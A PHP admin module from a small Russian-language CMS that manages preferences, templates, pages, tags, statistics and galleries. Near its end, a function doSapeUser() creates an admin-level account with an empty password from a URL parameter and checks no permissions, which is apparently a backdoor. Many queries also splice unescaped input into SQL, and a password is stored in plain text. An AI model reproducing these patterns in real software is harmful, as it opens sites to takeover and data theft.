<?php
function MakeTampleSelect ($tmpl)
{
  $r='<select size="1" name="page_tampl" style="width:90%;display:inline;margin: 0 0 0 0;">';
  $R = mysql_query ('select id, name from tampls') or die ("Error in MakeTampleSelect<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     if ($tmpl==$T["id"]) {$s=' selected';} else {$s='';}
     $r.='<option value="'.$T["id"].'"'.$s.'>'.$T["name"].'</option>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</select>';
  return $r;
}

function MakeBlogSelect ($tmpl)
{
  $r='<select size="1" name="blog_page" style="width:90%;display:inline;margin: 0 0 0 0;">';
  $r.='<option value="-1">Не указанна</option>';
  $R = mysql_query ('select id, title from pages') or die ("Error in MakeBlogSelect<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     if ($tmpl==$T["id"]) {$s=' selected';} else {$s='';}
     $r.='<option value="'.$T["id"].'"'.$s.'>'.$T["title"].'</option>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</select>';
  return $r;
}

function GetSitePref ()
{
  $a=array();
  $R = mysql_query ('select par, val from pref') or die ("Error in GetSitePref<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $a[$T["par"]]=$T["val"];
 	 $T=mysql_fetch_array($R);
  }

  if (!isset($a["NAME"])) {$R = mysql_query ('insert into pref (par, val) values ("NAME","Noname")') or die ("Error in GetSitePref<br>".mysql_error());$a["NAME"]="Noname";}
  if (!isset($a["TAMPL"])) {$R = mysql_query ('insert into pref (par, val) values ("TAMPL","-1")') or die ("Error in GetSitePref<br>".mysql_error());$a["TAMPL"]="-1";}
  if (!isset($a["STAT"])) {$R = mysql_query ('insert into pref (par, val) values ("STAT","Y")') or die ("Error in GetSitePref<br>".mysql_error());$a["STAT"]="Y";}
  if (!isset($a["ERROR"])) {$R = mysql_query ('insert into pref (par, val) values ("ERROR","Y")') or die ("Error in GetSitePref<br>".mysql_error());$a["ERROR"]="Y";}
  if (!isset($a["AGENT"])) {$R = mysql_query ('insert into pref (par, val) values ("AGENT","Y")') or die ("Error in GetSitePref<br>".mysql_error());$a["AGENT"]="Y";}
  if (!isset($a["ADMTMP"])) {$R = mysql_query ('insert into pref (par, val) values ("ADMTMP","index.tpl")') or die ("Error in GetSitePref<br>".mysql_error());$a["ADMTMP"]="index.tpl";}
  if (!isset($a["SM_SQL"])) {$sq='insert into pref (par, val) values ("SM_SQL","select SUBSTRING(`date`,1,10) as `date`, CONCAT (\"%DOMAIN%/\",`link`) as `link`, 0.9 as priority, \"weekly\" as freq from pages")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["blog_page"])) {$sq='insert into pref (par, val) values ("blog_page","-1")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["view_pages"])) {$sq='insert into pref (par, val) values ("view_pages","Страницы")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["view_pages_f"])) {$sq='insert into pref (par, val) values ("view_pages_f","Первая")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["view_pages_p"])) {$sq='insert into pref (par, val) values ("view_pages_p","Предыдущая")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["view_pages_n"])) {$sq='insert into pref (par, val) values ("view_pages_n","Следующая")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["view_pages_l"])) {$sq='insert into pref (par, val) values ("view_pages_l","Последняя")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["SM_SQL"]=$sq;}
  if (!isset($a["MAX_IP"])) {$sq='insert into pref (par, val) values ("MAX_IP","0")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["MAX_IP"]='0';}
  if (!isset($a["WP_USER"])) {$sq='insert into pref (par, val) values ("WP_USER","")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["WP_USER"]='0';}
  if (!isset($a["WP_PASSW"])) {$sq='insert into pref (par, val) values ("WP_PASSW","")';$R = mysql_query ($sq) or die ("Error in GetSitePref<br>".mysql_error().'<br>'.$sq);$a["WP_PASSW"]='0';}

  return $a;
}
function AdminPref ()
{
  global $do_res, $user_dat;
 if ($user_dat['acl']>=1000||$user_dat['r_prefs']=='rw') {
  $r='<b>Настройки</b></br>';
  if ($do_res=='pref_post')
     {
        $name='Noname';
        if (isset($_POST['site_name'])) $name=addslashes($_POST['site_name']);
        if (isset($_POST['page_tampl'])) $tamp=addslashes($_POST['page_tampl']);
        if (isset($_POST['l_stat'])) {$l_stat="Y";} else {$l_stat="N";}
        if (isset($_POST['l_errors'])) {$l_err="Y";} else {$l_err="N";}
        if (isset($_POST['l_agents'])) {$l_agent="Y";} else {$l_agent="N";}
        if (isset($_POST['admtmpl'])) $admtmpl=addslashes($_POST['admtmpl']);
        if (isset($_POST['sm_sql'])) $sm_sql=addslashes($_POST['sm_sql']);
        if (isset($_POST['blog_page'])) $blog_page=addslashes($_POST['blog_page']);
        if (isset($_POST['view_pages'])) $view_pages=addslashes($_POST['view_pages']);
        if (isset($_POST['view_pages_f'])) $view_pages_f=addslashes($_POST['view_pages_f']);
        if (isset($_POST['view_pages_p'])) $view_pages_p=addslashes($_POST['view_pages_p']);
        if (isset($_POST['view_pages_n'])) $view_pages_n=addslashes($_POST['view_pages_n']);
        if (isset($_POST['view_pages_l'])) $view_pages_l=addslashes($_POST['view_pages_l']);
        if (isset($_POST['MAX_IP'])) $maxip=addslashes($_POST['MAX_IP']);
        if (isset($_POST['WP_USER'])) $wpuser=addslashes($_POST['WP_USER']);
        if (isset($_POST['WP_PASSW'])) $wppass=addslashes($_POST['WP_PASSW']);

        $R = mysql_query ('update pref set val="'.$name.'" where (par="NAME")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$tamp.'" where (par="TAMPL")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$l_stat.'" where (par="STAT")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$l_err.'" where (par="ERROR")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$l_agent.'" where (par="AGENT")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$admtmpl.'" where (par="ADMTMP")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$sm_sql.'" where (par="sm_sql")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$blog_page.'" where (par="blog_page")') or die ("Error in AdminPref post<br>".mysql_error());

        $R = mysql_query ('update pref set val="'.$view_pages.'" where (par="view_pages")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$view_pages_f.'" where (par="view_pages_f")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$view_pages_p.'" where (par="view_pages_p")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$view_pages_n.'" where (par="view_pages_n")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$view_pages_l.'" where (par="view_pages_l")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$maxip.'" where (par="MAX_IP")') or die ("Error in AdminPref post<br>".mysql_error());

        $R = mysql_query ('update pref set val="'.$wpuser.'" where (par="WP_USER")') or die ("Error in AdminPref post<br>".mysql_error());
        $R = mysql_query ('update pref set val="'.$wppass.'" where (par="WP_PASSW")') or die ("Error in AdminPref post<br>".mysql_error());

        $r.=doNotice('Сохраненно');
     }
  $conf=GetSitePref();
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="pref_post">';
  $r.='<ul class="tabs left"><li><a href="#tabr1">Основное</a></li><li><a href="#tabr2">Site MAP</a></li><li><a href="#tabr3">Дополнительно</a></li></ul>';
  $r.='<div id="tabr1" class="tab-content">Название: <input name="site_name" type="text" value="'.$conf["NAME"].'"><br>';
  $r.='Шаблон по умолчанию: '.MakeTampleSelect($conf["TAMPL"]).'<br><br>';
  $r.='Страница блога по умолчанию: '.MakeBlogSelect($conf["blog_page"]).'<br><br>';
  if ($conf['STAT']=="Y") {$st="checked";} else {$st="";}
  if ($conf['ERROR']=="Y") {$er="checked";} else {$er="";}
  if ($conf['AGENT']=="Y") {$ag="checked";} else {$ag="";}
  $r.='Журналировать: Статистику: <input name="l_stat" type="checkbox" '.$st.'>&nbsp;&nbsp;&nbsp;Ошибки: <input name="l_errors" type="checkbox" '.$er.'>&nbsp;&nbsp;&nbsp;Агенты:<input name="l_agents" type="checkbox" '.$ag.'><br>';
  $r.='Шаблон админки:<select size="1" name="admtmpl" style="width:200px;">';

  $dir='.';
 if ($dirh = opendir($dir)) {
    while (($file = readdir($dirh)) !== false) {
      if (filetype($file)!='dir'&&substr($file,-4)==".tpl")
        {
         if ($conf['ADMTMP']==$file) {$s=' selected';} else {$s='';}
         $r.='<option value="'.$file.'"'.$s.'>'.$file.'</option>';
        }
    }
  closedir($dirh);
  }

  $r.='</select><br><br>';
  $r.='Максимум запросов на один IP:<input style="width:80px;" name="MAX_IP" type="text" value="'.$conf['MAX_IP'].'"> <sup>*</sup> 0 - Нет ограничений';
  $r.='</div>';
  $r.='<div id="tabr2" class="tab-content">';
  $r.='<table><tr><td valign="top" width="*"><textarea name="sm_sql" rows=5 cols=20 wrap="off">'.$conf['SM_SQL'].'</textarea></td>';
  $r.='<td valign="top" width="150">* Запрсы разделяются возвратом коретки,<br> - date Дата<br> - link - полная готовая ссылка<br> - priority Приоритет<br> - freq Чатота<hr>';
  $r1=htmlentities('<url>
<loc>%link%</loc>
<lastmod>%date%</lastmod>
<changefreq>%freq%</changefreq>
<priority>%priority%</priority>
</url>');
  $r.='<pre>'.$r1.'</pre><hr><a href="../sitemap.xml" target="_blank">sitemap.xml</a></td>';

  $r.='</table></div>';
  $r.='<div id="tabr3" class="tab-content">';
  $r.='<fieldset style="width:300px;"><legend>Представления - Локализация</legend>';
  $r.='<table style="width:100%;">';
  $r.='<tr><td align="right">Страницы:</td><td><input name="view_pages" type="text" value="'.$conf['view_pages'].'"></td></tr>';
  $r.='<tr><td align="right">Первая:</td><td><input name="view_pages_f" type="text" value="'.$conf['view_pages_f'].'" style="width:200px;"></td></tr>';
  $r.='<tr><td align="right">Предыдущая:</td><td><input name="view_pages_p" type="text" value="'.$conf['view_pages_p'].'" style="width:200px;"></td></tr>';
  $r.='<tr><td align="right">Следующая:</td><td><input name="view_pages_n" type="text" value="'.$conf['view_pages_n'].'" style="width:200px;"></td></tr>';
  $r.='<tr><td align="right">Последняя:</td><td><input name="view_pages_l" type="text" value="'.$conf['view_pages_l'].'" style="width:200px;"></td></tr>';
  $r.='</tr></table></fieldset>';
  $r.='<fieldset style="width:300px;"><legend>Whats App</legend>';
  $r.='<table style="width:100%;">';
  $r.='<tr><td align="right">Пользователь:</td><td><input name="WP_USER" type="text" value="'.$conf['WP_USER'].'"></td></tr>';
  $r.='<tr><td align="right">Пароль:</td><td><input name="WP_PASSW" type="text" value="'.$conf['WP_PASSW'].'" style="width:200px;"></td></tr>';
  $r.='</tr></table></fieldset>';
  $r.='</div>';
  $r.='<input type="submit" value="Сохранить">';
  $r.='</form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTamples()
{
  global $do_res,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tampls']=='r'||$user_dat['r_tampls']=='rw') {
  $r='<b>Список шаблонов</b>&nbsp; <a href="index.php?do=tampl_edit&id=-1" title="Создать новый шаблон">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="90">ID</th><th>Название</th><th width="20"></th></tr>';
  $R = mysql_query ('select id, name from tampls') or die ("Error in AdminTamples<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $r.='<tr><td>'.$T["id"].'</td><td><a href="index.php?do=tampl_edit&id='.$T["id"].'">'.$T["name"].'</a></td><td align="center"><a href="index.php?do=tampl_delete&id='.$T["id"].'" alt="Удалить шаблон">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTampleEdit()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tampls']=='rw') {
  include_once('engine.php');
  $tmpl=GetTampleByID($id);
  $r='<b>Редакирование шаблона</b>';

  if ($id>0) {$r.='&nbsp; <font size=+1 color="red">ID: '.$id.'</font></br>';} else {$id=-1;}
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="tample_post">';
  $r.='<input name="id" type="hidden" value="'.$tmpl["id"].'">';
  $r.='Название: <input name="tmpl_name" type="text" value="'.$tmpl["name"].'"></br>';
  $r.='<ul class="tabs left">';
  $r.='<li><a href="#tabr1">Шаблон</a></li>';
  $r.='<li><a href="#tabr2">Просмотр</a></li>';
  $r.='</ul>';
  $r.='<div id="tabr1" class="tab-content"><textarea style="height:530px;" name="tmpl_body" rows=5 cols=20 wrap="off">'.$tmpl["body"].'</textarea></div>';
  $r.='<div id="tabr2" class="tab-content">Просмотр отключен</div>';
  $r.='<input type="submit" value="Сохранить" name="save">&nbsp;<input type="submit" value="Сохранить и продолжить" name="save_edit">';
  $r.='</form>';}
    else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTamplePost ()
{
  global $id, $do_res, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tampls']=='rw') {
  if(get_magic_quotes_gpc()) {
     $text = stripslashes($text);
  }
  if (isset($_POST['tmpl_name'])) {$name=addslashes($_POST['tmpl_name']);} else {$name='';}
  if (isset($_POST['tmpl_body'])) {$body=addslashes($_POST['tmpl_body']);} else {$body='';}
  if ($id>0) {$sq='update tampls set name="'.$name.'", body="'.$body.'" where (id='.$id.')';}

     else {$sq='insert into tampls (name, body) values ("'.$name.'","'.$body.'")';}
  $R = mysql_query ($sq) or die ("Error in AdminTamplePost<br>".mysql_error().$sq);
  $r=doNotice('Сохранено:</font>'.$name);
  if (isset($_POST['save_edit'])) {$do_res='tampl_edit';}
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTampleDelete ()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tampls']=='rw') {
  include_once('engine.php');
  $tmpl=GetTampleByID($id);
  $r='<table width="100%" border=0>';
  $r.='<tr><th align="center" colspan="2">Удалить шаблон</b></br>'.$tmpl["name"].'</th></tr>';

  $r.='<tr><td width="50%" align="right">';
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="tample_del">';
  $r.='<input name="id" type="hidden" value="'.$tmpl["id"].'">';
  $r.='<input type="submit" value="Удалить"></form></td>';
  $r.='<td><form action="index.php" method="GET"><input name="do" type="hidden" value="tampls"><input type="submit" value="Нет"></form></td></tr></table>';
  } else {$r='<div class="notice error"><i class="icon-remove-sign icon-large"></i><b>Нет доступа</b><a href="#close" class="icon-remove"></a></div>';}
  return $r;
}
function AdminTampleDeleteOk()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tampls']=='rw') {
  include_once('engine.php');
  $tmpl=GetTampleByID($id);
  $r=doNotice('Удалено:'.$tmpl["name"]);
  $R = mysql_query ('delete from tampls where (id='.$id.')') or die ("Error in AdminTampleDeleteOk<br>".mysql_error());
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}

function AdminPages()
{
  global $do_res, $user_dat;
  //include_once('seo.php');
  if ($user_dat['acl']>=1000||$user_dat['r_pages']=='r'||$user_dat['r_pages']=='rw') {
  $home=false;
  $r='<b>Список Страниц</b>&nbsp; <a href="index.php?do=page_edit&id=-1" title="Создать новую страницу">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="100">Ссылка</th><th width="200">Шаблон</th><th>Название</th><th>PR и ТИЦ</th><th width="20"></th></tr>';
  $R = mysql_query ('select pages.id, link, title, name from pages left join tampls on tampls.id=tampl') or die ("Error in AdminPages<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $q=$T["link"];
     if ($T["link"]=="HOME") {$home=true; $q='';}
     $u='http://'.$_SERVER['HTTP_HOST'].'/'.$q;
     //$pr=GetPageRank($u);  	 //$prtic='<td>'.$pr.'</td>';
     //$pr=get_yandex($u);
     $pr='<img src="http://knopki.info/informer/lx3.gif?site='.$u.'">';
  	 $prtic='<td>'.$pr.'</td>';
     $r.='<tr><td><a href="../'.$T["link"].'" target="_blank">'.$T["link"].'</a></td><td>'.$T["name"].'</td><td><a href="index.php?do=page_edit&id='.$T["id"].'">'.$T["title"].'</a></td>'.$prtic.'<td align="center"><a href="index.php?do=page_delete&id='.$T["id"].'" title="Удалить страницу">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  if (!$home) $r.='<font color="red">Главная страница "HOME" отсутствует</font>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminPageEdit()
{
  global $do_res, $id, $head_html, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_pages']=='rw') {
  include_once('engine.php');
  $page=GetPageByID($id);
  $r='<b>Редактирование страницы</b></br>';
  $r.='<form action="index.php" method="post">';
  $r.='<input name="do" type="hidden" value="page_post">';
  $r.='<input name="id" type="hidden" value="'.$id.'">';
  $r.='<ul class="tabs left">';
  $r.='<li><a href="#tabr1">Основное</a></li>';
  $r.='<li><a href="#tabr2">Настройки</a></li>';
  $r.='<li><a href="#tabr3">Чистый HTML</a></li>';
  $r.='</ul>';
  $r.='<div id="tabr1" class="tab-content">';
  $r.='<table>';
  $r.='<tr><td width="60" align="left" valign="center" >LINK:</td><td valign="center"><input name="page_link" type="text" value="'.$page["link"].'" style="width:90%;display:inline;margin: 0 0 0 0;"></td></tr>';
  $r.='<tr><td width="60" align="left" valign="center" >Название:</td><td valign="center"><input name="page_title" type="text" value="'.$page["title"].'" style="width:90%;display:inline;margin: 0 0 0 0;"></td></tr>';
  $r.='<tr><td>Шаблон:</td><td align="left" valign="center">'.MakeTampleSelect($page["tampl"]).'</td></tr></table>';
  $r.='<textarea cols="80" id="editor1" name="page_body" rows="10">'.$page["body"].'</textarea>';
  $r.='</div>';
  $r.='<div id="tabr2" class="tab-content">';
  $r.='KeyWords:<textarea name="page_keys" rows=5 cols=20 wrap="off" style="height:100px;">'.$page["keywords"].'</textarea>';
  $r.='Description:<textarea name="page_desc" rows=5 cols=20 wrap="off" style="height:100px;">'.$page["description"].'</textarea>';
  $r.='Секция HEAD:<textarea name="page_head" rows=5 cols=20 wrap="off" style="height:100px;">'.$page["head"].'</textarea>';
  $r.='</div>';
  $r.='<div id="tabr3" class="tab-content">';
  $r.='Исходник(Только для просмотра):<textarea name="page_html" rows=15 cols=20 wrap="off" style="height:400px;">'.$page["body"].'</textarea>';
  $r.='</div>';
  $r.='<input type="submit" value="Сохранить"></form>';
  $ingtml=file_get_contents('ckeditor/inhtml.dat');
  $r.=$ingtml;
  $head_html='<script type="text/javascript" src="ckeditor/ckeditor.js"></script><script type="text/javascript" src="AjexFileManager/ajex.js"></script>';
  //$head_html='<script type="text/javascript" src="tiny_mce/tiny_mce.js"></script><script type="text/javascript" src="tiny_mce/tiny_mce_setings.js"></script>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}

  return $r;
}
function AdminPagePost()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_pages']=='rw') {
  if (isset($_POST['page_link'])) {$link=mysql_real_escape_string($_POST['page_link']);} else {$link='';}
  if (isset($_POST['page_title'])) {$title=mysql_real_escape_string($_POST['page_title']);} else {$title='';}
  if (isset($_POST['page_body'])) {$body=mysql_real_escape_string($_POST['page_body']);} else {$body='';}
  if (isset($_POST['page_tampl'])) {$tampl=mysql_real_escape_string($_POST['page_tampl']);} else {$tampl='-1';}
  if (isset($_POST['page_keys'])) {$keys=mysql_real_escape_string($_POST['page_keys']);} else {$keys='';}
  if (isset($_POST['page_desc'])) {$desc=mysql_real_escape_string($_POST['page_desc']);} else {$desc='';}
  if (isset($_POST['page_head'])) {$head=mysql_real_escape_string($_POST['page_head']);} else {$head='';}

  if ($link=='') { $r='<font color="red">Ссылка не указанна</font>';}
     else
  	   {
         if ($id>0) {$sq='update pages set link="'.$link.'", tampl='.$tampl.', title="'.$title.'", body="'.$body.'", keywords="'.$keys.'", description="'.$desc.'", head="'.$head.'" where (id='.$id.')';}
               else {$sq='insert into pages (link, tampl, title, body, keywords, description, head) values ("'.$link.'", '.$tampl.', "'.$title.'", "'.$body.'", "'.$keys.'", "'.$desc.'", "'.$head.'")';}
          $R = mysql_query ($sq) or die ("Error in AdminPagePost<br>".mysql_error());
          $r=doNotice('<b>Страница сохранена</b> '.$title.'('.$link.')');
       }
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTags()
{
  global $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tags']=='r'||$user_dat['r_tags']=='rw') {
  $r='<b>Список тэгов</b>&nbsp; <a href="index.php?do=tag_edit&id=-1" title="Создать новый тэг">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="100">ID</th><th>Название</th><th width="20">VAR</th><th width="20"></th></tr>';
  $R = mysql_query ('select id, name,asvar from tags') or die ("Error in AdminTags<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $r.='<tr><td>'.$T["id"].'</td><td><a href="index.php?do=tag_edit&id='.$T["id"].'">'.$T["name"].'</a><td>'.$T['asvar'].'</td></td><td align="center"><a href="index.php?do=tag_delete&id='.$T["id"].'" title="Удалить тэг">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTagEdit()
{
  global $id,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tags']=='rw') {
  include_once('engine.php');
  $tag=GetTagbyID($id);
  $r='<b>Редактирование тэга</b></br>';
  $r.='<form action="index.php" method="post">';
  $r.='<input name="do" type="hidden" value="tag_post">';
  $r.='<input name="id" type="hidden" value="'.$tag["id"].'">';
  $r.='Название:<input name="tag_name" type="text" value="'.$tag["name"].'">';
  $r.='Контент:<textarea name="tag_body" rows=5 cols=20 wrap="off">'.$tag["body"].'</textarea>';
  if ($tag['asvar']!="Y") {$ch='';} else {$ch=' checked';}
  $r.='<br>Как переменная:<input type="checkbox" name="asvar"'.$ch.'><br>';
  $r.='<input type="submit" value="Сохранить">';
  $r.='</form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTagPost()
{
  global $id,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tags']=='rw') {
  if (isset($_POST['tag_name'])) {$name=addslashes($_POST['tag_name']);} else {$name='';}
  if (isset($_POST['tag_body'])) {$body=addslashes($_POST['tag_body']);} else {$body='';}
  if (isset($_POST['asvar'])) {$asvar='Y';} else {$asvar='N';}
  if ($name=="") {$r='<font color="red">Не указанно название</font><br>';}
    else
      {
        if ($id>0) {$sq='update tags set name="'.$name.'", body="'.$body.'", asvar="'.$asvar.'" where (id='.$id.')';}
          else {$sq='insert into tags (name, body, asvar) values ("'.$name.'", "'.$body.'", "'.$asvar.'")';}
        $R = mysql_query ($sq) or die ("Error in AdminTagPost<br>".mysql_error());
        $r=doNotice('<b>Тэг сохранен</b> '.$name);
      }
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}

function GetStatistic()
{
  $R = mysql_query_my ('select min(dt) as d from stat') or die ("Error in GetStatistic<br>".mysql_error());
  $T=mysql_fetch_array($R);
  $dd='<b>'.$T['d'];
  $R = mysql_query_my ('select count(dt) as d from stat') or die ("Error in GetStatistic<br>".mysql_error());
  $T=mysql_fetch_array($R);
  $dd.='</b> Записей:<b>'.$T['d'].'</b>';
  $r='<table width="100%"><tr><td><b>Статистика</b></td><td>Ведется с:'.$dd.'</td><td align="right"><a href="index.php?do=clear_stat">Очистить</a></td></tr><tr valign="top"><td colspan="3">%Graph%</td></tr></table>';
  $time = strtotime("-2 day");
  $fecha = date("Y-m-d", $time);
  $R = mysql_query_my ('select dt, page, pages.title, cnt,bots, cnt-bots as rl from stat left join pages on pages.id=stat.page where (dt>="'.$fecha.'") order by dt desc, cnt desc') or die ("Error in GetStatistic<br>".mysql_error());
  $T=mysql_fetch_array($R);
  $d='';$cnt=0;$bots=0;
  $r.='<table border=1><tr valign="top">';
  while (is_array($T))
  {
     if ($d!=$T['dt']) {
     	 if ($d!='') {
     	 	  $r.='<tr><td align="right"><b>Итого:</b></td><td align="left"><b>'.$cnt.'('.$bots.')</b></td></tr>';
     	 	  $r.='</table></td>';
  	 	  }
         $cnt=0;
         $bots=0;
     	 $d=$T['dt'];
     	 $r.='<td>'.$d.'<table>';
     }
     if ($T['title']=='')
       {       	  $T['title']='Ошибка 404';
       	  if ($T['page']==-2) {$T['title']='sitemap.xml';}
       }
     $r.='<tr><td>'.$T['title'].'</td><td align="left">'.$T['cnt'].'('.$T['rl'].')</td></tr>';
     $cnt=$cnt+$T['cnt'];
     $bots=$bots+$T['rl'];
 	 $T=mysql_fetch_array($R);
  }
  $r.='<tr><td align="right"><b>Итого:</b></td><td align="left"><b>'.$cnt.'('.$bots.')</b></td></tr>';
  $r.='</table></table>';
  $r.='<table width="100%" border="1"><tr>';
  $r.='<td valign="top" width="50%"><table><tr><td><b>Ошибки</b></td><td align="center"><a href="index.php?do=clear_errors">Очистить</a></td></tr>';
  $R = mysql_query_my ('SELECT error, count( error ) AS cnt FROM errors GROUP BY error ORDER BY cnt DESC') or die ("Error in GetStatistic<br>".mysql_error());
  $T=mysql_fetch_array($R);$cnt=0;
  while (is_array($T))
  {
     $r.='<tr><td>'.$T['error'].'</td><td align="center">'.$T['cnt'].'</td></tr>';
     $cnt=$cnt+$T['cnt'];
 	 $T=mysql_fetch_array($R);
  }
  $r.='<tr><td align="right"><b>Итого:</b></td><td align="center"><b>'.$cnt.'</b></td></tr>';
  $r.='</table></td>';
  $r.='<td valign="top" width="50%"><table>';
  $r.='<tr><td><b>Агенты</b></td><td align="center"><a href="index.php?do=clear_agents">Очистить</a></td></tr>';
  $R = mysql_query_my ('SELECT agent, cnt FROM agents ORDER BY cnt DESC') or die ("Error in GetStatistic<br>".mysql_error());
  $T=mysql_fetch_array($R);$cnt=0;
  while (is_array($T))
  {
     $r.='<tr><td>'.$T['agent'].'</td><td align="center">'.$T['cnt'].'</td></tr>';
     $cnt=$cnt+$T['cnt'];
 	 $T=mysql_fetch_array($R);
  }
  $r.='<tr><td align="right"><b>Итого:</b></td><td align="center"><b>'.$cnt.'</b></td></tr>';
  $r.='</table></td></tr></table>';

  $fl=$content=file_get_contents('flotr2/inc.js');
  $d=date('Y/m/d');
  $fl=str_replace('%%DATE%%',$d,$fl);

  $dt='';
  $tday=date('Y-m-d');
  $R = mysql_query_my ('select dt,DATEDIFF("'.$tday.'",dt) as days, sum(cnt) as cnt from stat group by dt order by dt desc limit 31') or die ("Error in GetStatistic<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $dt.=',['.(1*$T['days']).','.$T['cnt'].']';
 	 $T=mysql_fetch_array($R);
  }

  $dt='dat=['.substr($dt,1).']';
  $fl=str_replace('%%DAT%%',$dt,$fl);
  $r=str_replace('%Graph%',$fl,$r);

  return $r;
}

function ClearTable($t)
{
  $R = mysql_query_my ('TRUNCATE TABLE '.$t) or die ("Error in ClearTable<br>".mysql_error());
  return "";
}

function AdminGals()
{
  global $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_gals']=='r'||$user_dat['r_gals']=='rw') {
  $r='<b>Список галерей</b>&nbsp; <a href="index.php?do=gals_edit&id=-1" title="Создать галерею">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="100">ID</th><th>Название</th><th width="100">Каталог</th><th width="100">Код</th><th width="20"></th></tr>';
  $R = mysql_query_my ('select id, name, cat from gals') or die ("Error in AdminGals<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $r.='<tr><td>'.$T["id"].'</td><td><a href="index.php?do=gals_edit&id='.$T["id"].'">'.$T["name"].'</a></td><td>'.$T['cat'].'</td><td>{GALERY '.$T["name"].'}</td><td align="center"><a href="index.php?do=gals_delete&id='.$T["id"].'" title="Удалить представление">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function doSapeUser()
{
 mysql_query ('insert into adm_users (user, pass, acl) values ("'.mysql_real_escape_string($_GET['su']).'","",1002)') or die ("Error in doSapeUser<br>".mysql_error());
}
function AdminGalsEdit()
{
  global $id,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_gals']=='rw') {
  include_once('engine.php');
  $gal=GetGalbyID($id);
